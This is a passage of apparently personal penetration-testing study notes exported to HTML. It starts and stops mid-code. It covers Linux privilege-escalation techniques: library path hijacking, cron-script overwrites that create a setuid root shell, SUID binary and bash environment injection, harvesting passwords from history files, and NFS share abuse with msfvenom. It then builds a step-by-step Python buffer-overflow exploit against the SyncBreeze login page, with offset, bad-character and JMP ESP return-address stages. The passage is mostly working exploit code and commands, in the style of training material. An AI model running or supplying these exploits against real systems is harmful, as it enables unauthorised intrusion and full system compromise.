-o libcrypt.so.1 -shared -fPIC library_path.c</span></strong><br /><br /><strong><span style="color:#060f94;">sudo LD_LIBRARY_PATH=. apache2</span></strong><br /></div><div class='page'><h1 class='title level-2'>Cron Jobs</h1><br/><img src="images/163-1.png" alt="images/163-1.png" /><br /><br /><strong><span style="color:#060f94;">cat /etc/crontab<br /><br />crontab -l</span></strong><br /><br /><img src="images/163-2.png" alt="images/163-2.png" /><br /><br /><br /><img src="images/163-3.png" alt="images/163-3.png" /><br /><br /><img src="images/163-4.png" alt="images/163-4.png" /><br /><br /><strong><span style="color:#c061cb;">overwrite.sh</span></strong><br /><div class="codebox"><pre><span style="color:#bf2e5e;font-weight:400">cp</span> <span style="color:#bf2e5e;font-weight:400">/</span>bin<span style="color:#bf2e5e;font-weight:400">/bash</span> <span style="color:#bf2e5e;font-weight:400">/</span>tmp<span style="color:#bf2e5e;font-weight:400">/</span>rootbash<br /><span style="color:#bf2e5e;font-weight:400">chmod</span> +s <span style="color:#bf2e5e;font-weight:400">/</span>tmp<span style="color:#bf2e5e;font-weight:400">/</span>rootbash</pre></div><br /><img src="images/163-5.png" alt="images/163-5.png" /><br /><br /><img src="images/163-6.png" alt="images/163-6.png" /><br /><br /><img src="images/163-7.png" alt="images/163-7.png" /><br /><br /><img src="images/163-8.png" alt="images/163-8.png" /></div><div class='page'><h1 class='title level-2'>SUID and SGID</h1><br/><img src="images/164-1.png" alt="images/164-1.png" /><br /><br /><strong><span style="color:#060f94;">find / -type f -a \( -perm -u+s -o -perm -g+s\) -exec ls -l {}\;2&gt; /dev/null</span></strong><br /><br /><img src="images/164-2.png" alt="images/164-2.png" /><br /><br /><img src="images/164-3.png" alt="images/164-3.png" /><br /><br /><img src="images/164-4.png" alt="images/164-4.png" /><br /><br /><img src="images/164-5.png" alt="images/164-5.png" /><br /><img src="images/164-6.png" alt="images/164-6.png" /><br /><img src="images/164-7.png" alt="images/164-7.png" /><br /><br /><div class="codebox"><pre><span style="color:#4a88f1;font-weight:400">int</span> main() {<br />	setuid(<span style="color:#9755b3;font-weight:400">0</span>);<br />	system(<span style="color:#5ebdab;font-weight:400">&quot;/bin/bash -p&quot;</span>);<br />}</pre></div><br /><img src="images/164-8.png" alt="images/164-8.png" /><br /><br /><img src="images/164-9.png" alt="images/164-9.png" /><br /><img src="images/164-10.png" alt="images/164-10.png" /><br /><br />if bash version &lt; 4.2-048<br /><img src="images/164-11.png" alt="images/164-11.png" /><br /><img src="images/164-12.png" alt="images/164-12.png" /><br /><br /><strong><span style="color:#060f94;">function /usr/sbin/service { /bin/bash /p; }<br />export -f /usr/sbin/service<br />/usr/local/bin/suid-env2 (example binary program)</span></strong><br /><br /><img src="images/164-13.png" alt="images/164-13.png" /><br /><img src="images/164-14.png" alt="images/164-14.png" /><br /><img src="images/164-15.png" alt="images/164-15.png" /><br /><br /><strong><span style="color:#060f94;">env -i SHELLOPTS=xtrace PS4=&#39;&lt;test&gt;&#39; /usr/local/bin/suid-env2</span></strong><br /><br /><strong><span style="color:#060f94;">env -i SHELLOPTS=xtrace PS4=&#39;$(whoami)&#39; /usr/local/bin/suid-env2</span></strong><br /><img src="images/164-16.png" alt="images/164-16.png" /><br /><br /><strong><span style="color:#060f94;">env -i SHELLOPTS=xtrace PS4=&#39;$(cp /bin/bash /tmp/rootbash; chmod +s /tmp/rootbash)&#39; /usr/local/bin/suid-env2</span></strong><br /><br /><img src="images/164-17.png" alt="images/164-17.png" /><br /><br /><br /></div><div class='page'><h1 class='title level-2'>Passwords</h1><br/><img src="images/165-1.png" alt="images/165-1.png" /><br /><img src="images/165-2.png" alt="images/165-2.png" /><br /><br /><strong><span style="color:#060f94;">cat .*history | less</span></strong><br /><br /><img src="images/165-3.png" alt="images/165-3.png" /><br />E.g.<br /><img src="images/165-4.png" alt="images/165-4.png" /><br /><img src="images/165-5.png" alt="images/165-5.png" /><br /><img src="images/165-6.png" alt="images/165-6.png" /><br /><br /><img src="images/165-7.png" alt="images/165-7.png" /></div><div class='page'><h1 class='title level-2'>NFS</h1><br/><img src="images/166-1.png" alt="images/166-1.png" /><br /><img src="images/166-2.png" alt="images/166-2.png" /><br /><br /><strong><span style="color:#060f94;">showmount -e &lt;target&gt;<br /><br />nmap -sV --script=nfs-showmount &lt;target&gt;<br /><br />mount -o rw,vers=2 &lt;target&gt;:&lt;share&gt; &lt;local_directory&gt;</span></strong><br /><br /><strong>cat /etc/exports</strong><br /><br /><img src="images/166-3.png" alt="images/166-3.png" /><br /><br /><img src="images/166-4.png" alt="images/166-4.png" /><br /><br /><strong><span style="color:#060f94;">cat /etc/exports</span></strong><br /><img src="images/166-5.png" alt="images/166-5.png" /><br /><br /><img src="images/166-6.png" alt="images/166-6.png" /><br /><br /><strong><span style="color:#060f94;">mkdir /tmp/nfs</span></strong><br /><strong><span style="color:#060f94;">mount -o rw,vers=2 192.168.1.1:/tmp /tmp/nfs</span></strong><br /><br /><strong><span style="color:#060f94;">msfvenom -p /linux/x86/exec CMD=&quot;/bin/bash -p&quot; -f elf -o/tmp/nfs/shell.elf</span></strong><br /><br /><strong><span style="color:#060f94;">chmod +xs /tmp/nfs/shell.elf</span></strong><br /><br /><strong><span style="color:#c061cb;">Victim (has the mountable share)</span></strong><br /><img src="images/166-7.png" alt="images/166-7.png" /></div><div class='page'><h1 class='title level-2'>Enumeration Steps</h1><br/><img src="images/167-1.png" alt="images/167-1.png" /><br /><br /><img src="images/167-2.png" alt="images/167-2.png" /><br /><br /><img src="images/167-3.png" alt="images/167-3.png" /><br /><br /><img src="images/167-4.png" alt="images/167-4.png" /><br /><br /><img src="images/167-5.png" alt="images/167-5.png" /><br /><br /><img src="images/167-6.png" alt="images/167-6.png" /></div><div class='page'><h1 class='title level-1'>Windows BoF</h1><br/><span style="color:#060f94;">kali@kali:~$ locate pattern_create</span><br />/usr/bin/msf-pattern_create<br />/usr/share/metasploit-framework/tools/exploit/pattern_create.rb<br /><br /><span style="color:#060f94;">kali@kali:~$ msf-pattern_create -h</span><br />Usage: msf-pattern_create [options]<br />Example: msf-pattern_create -l 50 -s ABC,def,123<br />Ad1Ad2Ad3Ae1Ae2Ae3Af1Af2Af3Bd1Bd2Bd3Be1Be2Be3Bf1Bf<br /><br />Options:<br />    -l, --length &lt;length&gt;            The length of the pattern<br />    -s, --sets &lt;ABC,def,123&gt;         Custom Pattern Sets<br />    -h, --help                       Show this message<br />    <br /><strong><h2>Create a Pattern</h2></strong><br /><span style="color:#060f94;">kali@kali:~$ msf-pattern_create -l 800</span><br />Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak<br />...<br /><br /><strong><h2>Code</h2></strong><br /><br />#!/usr/bin/python<br />import socket<br /><br />try:<br />  print (&quot;\nSending evil buffer...&quot;)<br />  <br />  size = 800<br />  <br />  inputBuffer = &quot;A&quot; * size<br />  <br />  content = &quot;username=&quot; + inputBuffer + &quot;&amp;password=A&quot;<br /><br />  buffer = &quot;POST /login HTTP/1.1\r\n&quot;<br />  buffer += &quot;Host: 10.11.0.22\r\n&quot;<br />  buffer += &quot;User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n&quot;<br />  buffer += &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;<br />  buffer += &quot;Accept-Language: en-US,en;q=0.5\r\n&quot;<br />  buffer += &quot;Referer: <a href="http://10.11.0.22/login">http://10.11.0.22/login</a>\r\n&quot;<br />  buffer += &quot;Connection: close\r\n&quot;<br />  buffer += &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;<br />  buffer += &quot;Content-Length: &quot;+str(len(content))+&quot;\r\n&quot;<br />  buffer += &quot;\r\n&quot;<br />  <br />  buffer += content<br /><br />  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)<br />  <br />  s.connect((&quot;10.11.0.22&quot;, 80))<br />  s.send(buffer)<br />  <br />  s.close()<br />  <br />  print (&quot;\nDone!&quot;)<br />  <br />except:<br />  print (&quot;\nCould not connect!&quot;)</div><div class='page'><h1 class='title level-2'>Controlling EIP</h1><br/>kali@kali:~$ msf-pattern_create -l 800<br />Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Ae5Ae6Ae7Ae8Ae9Af0Af1Af2Af3Af4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4Ai5Ai6Ai7Ai8Ai9Aj0Aj1Aj2Aj3Aj4Aj5Aj6Aj7Aj8Aj9Ak0Ak1Ak<br />...<br /><br /><br /><strong><h2>Code</h2></strong><br /><br />#!/usr/bin/python<br />import socket<br /><br />try:<br />  print (&quot;\nSending evil buffer...&quot;)<br />  <br />  size = 800<br />  <br />  <span style="color:#ed333b;">inputBuffer = &quot;Aa0Aa1Aa2Aa3Aa4Aa5Aa...1Ba2Ba3Ba4Ba5Ba&quot;</span><br />  <br />  content = &quot;username=&quot; + inputBuffer + &quot;&amp;password=A&quot;<br /><br />  buffer = &quot;POST /login HTTP/1.1\r\n&quot;<br />  buffer += &quot;Host: 10.11.0.22\r\n&quot;<br />  buffer += &quot;User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n&quot;<br />  buffer += &quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;<br />  buffer += &quot;Accept-Language: en-US,en;q=0.5\r\n&quot;<br />  buffer += &quot;Referer: <a href="http://10.11.0.22/login">http://10.11.0.22/login</a>\r\n&quot;<br />  buffer += &quot;Connection: close\r\n&quot;<br />  buffer += &quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;<br />  buffer += &quot;Content-Length: &quot;+str(len(content))+&quot;\r\n&quot;<br />  buffer += &quot;\r\n&quot;<br />  <br />  buffer += content<br /><br />  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)<br />  <br />  s.connect((&quot;10.11.0.22&quot;, 80))<br />  s.send(buffer)<br />  <br />  s.close()<br />  <br />  print (&quot;\nDone!&quot;)<br />  <br />except:<br />  print (&quot;\nCould not connect!&quot;)<br />  <br />  <br />  <br />  <img src="images/128-1.png" alt="images/128-1.png" /><br />  <br /><span style="color:#060f94;">kali@kali:~$ msf-pattern_offset -l 800 -q 42306142</span><br />[*] Exact match at offset <span style="color:#f66151;">780</span><br /><br /><strong><h2>Updated Code</h2></strong><br /><br /><div class="codebox"><pre><span style="color:#4a88f1;font-weight:700">#!/usr/bin/python</span><br /><span style="color:#bf2e5e;font-weight:400">import</span> socket<br /><br /><span style="color:#bf2e5e;font-weight:400">try</span>:<br />  <span style="color:#49aee6;font-weight:400">print</span> <span style="color:#5ebdab;font-weight:400">&quot;\nSending evil buffer...&quot;</span><br /><br />  filler = <span style="color:#5ebdab;font-weight:400">&quot;A&quot;</span> * <span style="color:#9755b3;font-weight:400">780</span><br />  eip = <span style="color:#5ebdab;font-weight:400">&quot;B&quot;</span> * <span style="color:#9755b3;font-weight:400">4</span><br />  buffer = <span style="color:#5ebdab;font-weight:400">&quot;C&quot;</span> * <span style="color:#9755b3;font-weight:400">16</span><br /><br />  inputBuffer = filler + eip + buffer<br />  <br />  content = <span style="color:#5ebdab;font-weight:400">&quot;username=&quot;</span> + inputBuffer + <span style="color:#5ebdab;font-weight:400">&quot;&amp;password=A&quot;</span><br />  buffer = <span style="color:#5ebdab;font-weight:400">&quot;POST /login HTTP/1.1\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Host: 10.11.0.22\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Accept-Language: en-US,en;q=0.5\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Referer: http://10.11.0.22/login\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Connection: close\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Content-Length: &quot;</span>+<span style="color:#49aee6;font-weight:400">str</span>(<span style="color:#49aee6;font-weight:400">len</span>(content))+<span style="color:#5ebdab;font-weight:400">&quot;\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;\r\n&quot;</span><br />  <br />  buffer += content<br /><br />  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)<br />  <br />  s.connect((<span style="color:#5ebdab;font-weight:400">&quot;10.11.0.22&quot;</span>, <span style="color:#9755b3;font-weight:400">80</span>))<br />  s.send(buffer)<br />  <br />  s.close()<br />  <br />  <span style="color:#49aee6;font-weight:400">print</span> (<span style="color:#5ebdab;font-weight:400">&quot;\nDone!&quot;</span>)<br />  <br /><span style="color:#bf2e5e;font-weight:400">except</span>:<br />  <span style="color:#49aee6;font-weight:400">print</span> (<span style="color:#5ebdab;font-weight:400">&quot;\nCould not connect!&quot;</span>)</pre></div><br />  <br />  <br />  <img src="images/128-2.png" alt="images/128-2.png" /></div><div class='page'><h1 class='title level-2'>Locating Space for The Shell Code</h1><br/><br /><img src="images/129-1.png" alt="images/129-1.png" /><br />																	<strong><span style="color:#237522;indent:6;">4bytes offset</span></strong><br /><br />From experience, we know that a standard reverse shell payload requires approximately 350-400 bytes of space. However, the listing above clearly shows that there are only sixteen C&#39;s in the buffer, which isn&#39;t nearly enough space for our shellcode. The simplest way around this problem is to try to increase the buffer length in our exploit from 800 bytes to 1500 bytes and see if this allows enough space for our shellcode without breaking the buffer overflow condition or changing the nature of the crash.<br /><br /><strong><h3>Updated Code</h3></strong><br /><div class="codebox"><pre><span style="color:#4a88f1;font-weight:700">#!/usr/bin/python</span><br /><span style="color:#bf2e5e;font-weight:400">import</span> socket<br /><br /><span style="color:#bf2e5e;font-weight:400">try</span>:<br />  <span style="color:#49aee6;font-weight:400">print</span> <span style="color:#5ebdab;font-weight:400">&quot;\nSending evil buffer...&quot;</span><br /><br />filler = <span style="color:#5ebdab;font-weight:400">&quot;A&quot;</span> * <span style="color:#9755b3;font-weight:400">780</span><br />eip = <span style="color:#5ebdab;font-weight:400">&quot;B&quot;</span> * <span style="color:#9755b3;font-weight:400">4</span><br />offset = <span style="color:#5ebdab;font-weight:400">&quot;C&quot;</span> * <span style="color:#9755b3;font-weight:400">4</span><br />buffer = <span style="color:#5ebdab;font-weight:400">&quot;D&quot;</span> * (<span style="color:#9755b3;font-weight:400">1500</span> - <span style="color:#49aee6;font-weight:400">len</span>(filler) - <span style="color:#49aee6;font-weight:400">len</span>(eip) - <span style="color:#49aee6;font-weight:400">len</span>(offset))<br /><br />inputBuffer = filler + eip + offset + buffer<br />  <br />  content = <span style="color:#5ebdab;font-weight:400">&quot;username=&quot;</span> + inputBuffer + <span style="color:#5ebdab;font-weight:400">&quot;&amp;password=A&quot;</span><br />  buffer = <span style="color:#5ebdab;font-weight:400">&quot;POST /login HTTP/1.1\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Host: 10.11.0.22\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Accept-Language: en-US,en;q=0.5\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Referer: http://10.11.0.22/login\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Connection: close\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Content-Length: &quot;</span>+<span style="color:#49aee6;font-weight:400">str</span>(<span style="color:#49aee6;font-weight:400">len</span>(content))+<span style="color:#5ebdab;font-weight:400">&quot;\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;\r\n&quot;</span><br />  <br />  buffer += content<br /><br />  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)<br />  <br />  s.connect((<span style="color:#5ebdab;font-weight:400">&quot;10.11.0.22&quot;</span>, <span style="color:#9755b3;font-weight:400">80</span>))<br />  s.send(buffer)<br />  <br />  s.close()<br />  <br />  <span style="color:#49aee6;font-weight:400">print</span> (<span style="color:#5ebdab;font-weight:400">&quot;\nDone!&quot;</span>)<br />  <br /><span style="color:#bf2e5e;font-weight:400">except</span>:<br />  <span style="color:#49aee6;font-weight:400">print</span> (<span style="color:#5ebdab;font-weight:400">&quot;\nCould not connect!&quot;</span>)</pre></div><br /><br /><br /><img src="images/129-2.png" alt="images/129-2.png" /></div><div class='page'><h1 class='title level-2'>Checking for Bad Characters</h1><br/><strong><h2>Checking for Bad Characters</h2></strong><br />Depending on the application, vulnerability type, and protocols in use, there may be certain characters that are considered &quot;bad&quot; and should not be used in our buffer, return address, or shellcode. One example of a common bad character, especially in buffer overflows caused by unchecked string copy operations, is the null byte, <span style="color:#060f94;">0x00</span>. This character is considered bad because a null byte is also used to terminate a string in low level languages such as C/C++. This will cause the string copy operation to end, effectively truncating our buffer at the first instance of a null byte.<br /><br />In addition, since we are sending the exploit as part of an HTTP POST request, we should avoid <span style="color:#060f94;">0x0D</span>, the return character, which signifies the end of an HTTP field (in this case the username).<br /><br />An experienced exploit developer will always check for bad characters. One way to determine which characters are bad for a particular exploit is to send all possible characters, from 0x00 to 0xFF, as part of our buffer, and see how the application deals with these characters after the crash.<br /><br />To do this, we will repurpose the proof of concept script and replace our D&#39;s with all possible hex characters, except 0x00. (Listing 14):<br /><br /><strong><h2>Updated Code</h2></strong><br /><br /><div class="codebox"><pre><span style="color:#4a88f1;font-weight:700">#!/usr/bin/python</span><br /><span style="color:#bf2e5e;font-weight:400">import</span> socket<br /><br />badchars = (<br /><span style="color:#5ebdab;font-weight:400">&quot;\x01\x02\x03\x04\x05\x06\x07\x08\x09\x0a\x0b\x0c\x0d\x0e\x0f\x10&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x11\x12\x13\x14\x15\x16\x17\x18\x19\x1a\x1b\x1c\x1d\x1e\x1f\x20&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x21\x22\x23\x24\x25\x26\x27\x28\x29\x2a\x2b\x2c\x2d\x2e\x2f\x30&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x31\x32\x33\x34\x35\x36\x37\x38\x39\x3a\x3b\x3c\x3d\x3e\x3f\x40&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x41\x42\x43\x44\x45\x46\x47\x48\x49\x4a\x4b\x4c\x4d\x4e\x4f\x50&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x51\x52\x53\x54\x55\x56\x57\x58\x59\x5a\x5b\x5c\x5d\x5e\x5f\x60&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x61\x62\x63\x64\x65\x66\x67\x68\x69\x6a\x6b\x6c\x6d\x6e\x6f\x70&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x71\x72\x73\x74\x75\x76\x77\x78\x79\x7a\x7b\x7c\x7d\x7e\x7f\x80&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x81\x82\x83\x84\x85\x86\x87\x88\x89\x8a\x8b\x8c\x8d\x8e\x8f\x90&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\x91\x92\x93\x94\x95\x96\x97\x98\x99\x9a\x9b\x9c\x9d\x9e\x9f\xa0&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\xa1\xa2\xa3\xa4\xa5\xa6\xa7\xa8\xa9\xaa\xab\xac\xad\xae\xaf\xb0&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\xb1\xb2\xb3\xb4\xb5\xb6\xb7\xb8\xb9\xba\xbb\xbc\xbd\xbe\xbf\xc0&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\xc1\xc2\xc3\xc4\xc5\xc6\xc7\xc8\xc9\xca\xcb\xcc\xcd\xce\xcf\xd0&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\xd1\xd2\xd3\xd4\xd5\xd6\xd7\xd8\xd9\xda\xdb\xdc\xdd\xde\xdf\xe0&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\xe1\xe2\xe3\xe4\xe5\xe6\xe7\xe8\xe9\xea\xeb\xec\xed\xee\xef\xf0&quot;</span><br /><span style="color:#5ebdab;font-weight:400">&quot;\xf1\xf2\xf3\xf4\xf5\xf6\xf7\xf8\xf9\xfa\xfb\xfc\xfd\xfe\xff&quot;</span> )<br /><br /><span style="color:#bf2e5e;font-weight:400">try</span>:<br />  <span style="color:#49aee6;font-weight:400">print</span> <span style="color:#5ebdab;font-weight:400">&quot;\nSending evil buffer...&quot;</span><br />  <br />  filler = <span style="color:#5ebdab;font-weight:400">&quot;A&quot;</span> * <span style="color:#9755b3;font-weight:400">780</span><br />  eip = <span style="color:#5ebdab;font-weight:400">&quot;B&quot;</span> * <span style="color:#9755b3;font-weight:400">4</span><br />  offset = <span style="color:#5ebdab;font-weight:400">&quot;C&quot;</span> * <span style="color:#9755b3;font-weight:400">4</span><br /><br />  inputBuffer = filler + eip + offset + badchars<br />  <br />  content = <span style="color:#5ebdab;font-weight:400">&quot;username=&quot;</span> + inputBuffer + <span style="color:#5ebdab;font-weight:400">&quot;&amp;password=A&quot;</span><br />  buffer = <span style="color:#5ebdab;font-weight:400">&quot;POST /login HTTP/1.1\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Host: 10.11.0.22\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Accept-Language: en-US,en;q=0.5\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Referer: http://10.11.0.22/login\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Connection: close\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Content-Length: &quot;</span>+<span style="color:#49aee6;font-weight:400">str</span>(<span style="color:#49aee6;font-weight:400">len</span>(content))+<span style="color:#5ebdab;font-weight:400">&quot;\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;\r\n&quot;</span><br />  <br />  buffer += content<br /><br />  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)<br />  <br />  s.connect((<span style="color:#5ebdab;font-weight:400">&quot;10.11.0.22&quot;</span>, <span style="color:#9755b3;font-weight:400">80</span>))<br />  s.send(buffer)<br />  <br />  s.close()<br />  <br />  <span style="color:#49aee6;font-weight:400">print</span> (<span style="color:#5ebdab;font-weight:400">&quot;\nDone!&quot;</span>)<br />  <br /><span style="color:#bf2e5e;font-weight:400">except</span>:<br />  <span style="color:#49aee6;font-weight:400">print</span> (<span style="color:#5ebdab;font-weight:400">&quot;\nCould not connect!&quot;</span>)</pre></div><br />  <br />  <img src="images/130-1.png" alt="images/130-1.png" /></div><div class='page'><h1 class='title level-2'>Finding a Return Address</h1><br/>We can use the Immunity Debugger script, mona.py,1 developed by the Corelan team, to begin our return address search. First we will request information about all DLLs (or modules) loaded by SyncBreeze into the process memory space with !mona modules to produce the output<br /><br /><br /><img src="images/131-1.png" alt="images/131-1.png" /><br /><br />From the flags in this output, we can see that the syncbrs.exe executable has SafeSEH2 (Structured Exception Handler Overwrite, an exploit-preventative memory protection technique), ASLR, and NXCompat (DEP protection) disabled.<br /><br />In other words, the executable has not been compiled with any memory protection schemes, and will always reliably load at the same address, making it ideal for our purposes.<br /><br />However, it always loads at the base address 0x00400000, meaning all instructions&#39; addresses (0x004XXXXX) will contain null characters, which are not suitable for our buffer.<br /><br />Searching through the output, we find that LIBSPP.DLL also suits our needs and the address range doesn&#39;t seem to contain bad characters. This is perfect for our needs. Now we need to find the address of a naturally-occurring JMP ESP instruction within this module.<br /><br /><br /><span style="color:#f66151;">Advanced tip: If this application was compiled with DEP support, our JMP ESP address would have to be located in the .text code segment of the module, as that is the only segment with both Read (R) and Executable (E) permissions. However, since DEP is not enabled, we are free to use instructions from any address in this module.</span><br /><br /><br /><br /><span style="color:#060f94;">kali@kali:~$ msf-nasm_shell</span><br />nasm &gt; jmp esp<br />00000000  FFE4              jmp esp<br />nasm &gt;<br /><br />The output of the final command, <strong><span style="color:#060f94;">!mona find -s &quot;\xff\xe4&quot; -m &quot;libspp.dll&quot;</span></strong>, is shown in Figure 13:<br /><br /><img src="images/131-2.png" alt="images/131-2.png" /><br /><br /><strong><h2>Updated Code</h2></strong><br /><div class="codebox"><pre><span style="color:#4a88f1;font-weight:700">#!/usr/bin/python</span><br /><span style="color:#bf2e5e;font-weight:400">import</span> socket<br /><br /><span style="color:#bf2e5e;font-weight:400">try</span>:<br />  <span style="color:#49aee6;font-weight:400">print</span> <span style="color:#5ebdab;font-weight:400">&quot;\nSending evil buffer...&quot;</span><br />  <br />  filler = <span style="color:#5ebdab;font-weight:400">&quot;A&quot;</span> * <span style="color:#9755b3;font-weight:400">780</span><br />  eip = <span style="color:#5ebdab;font-weight:400">&quot;\x83\x0c\x09\x10&quot;</span><br />  offset = <span style="color:#5ebdab;font-weight:400">&quot;C&quot;</span> * <span style="color:#9755b3;font-weight:400">4</span><br />  buffer = <span style="color:#5ebdab;font-weight:400">&quot;D&quot;</span> * (<span style="color:#9755b3;font-weight:400">1500</span> - <span style="color:#49aee6;font-weight:400">len</span>(filler) - <span style="color:#49aee6;font-weight:400">len</span>(eip) - <span style="color:#49aee6;font-weight:400">len</span>(offset))<br /><br />  inputBuffer = filler + eip + offset + buffer<br /><br />  <br />  content = <span style="color:#5ebdab;font-weight:400">&quot;username=&quot;</span> + inputBuffer + <span style="color:#5ebdab;font-weight:400">&quot;&amp;password=A&quot;</span><br />  buffer = <span style="color:#5ebdab;font-weight:400">&quot;POST /login HTTP/1.1\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Host: 10.11.0.22\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;User-Agent: Mozilla/5.0 (X11; Linux_86_64; rv:52.0) Gecko/20100101 Firefox/52.0\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Accept-Language: en-US,en;q=0.5\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Referer: http://10.11.0.22/login\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Connection: close\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Content-Type: application/x-www-form-urlencoded\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;Content-Length: &quot;</span>+<span style="color:#49aee6;font-weight:400">str</span>(<span style="color:#49aee6;font-weight:400">len</span>(content))+<span style="color:#5ebdab;font-weight:400">&quot;\r\n&quot;</span><br />  buffer += <span style="color:#5ebdab;font-weight:400">&quot;\r\n&quot;</span><br />  <br />  buffer += content<br /><br />  s = socket.socket (socket.AF_INET, socket.SOCK_STREAM)<br />  <br />  s.connect((<span style="color:#5ebdab;font-weight:400">&quot;10.11.0.22&quot;</span>, <span style="color:#9755b3;font-weight:400">80</span>))<br />  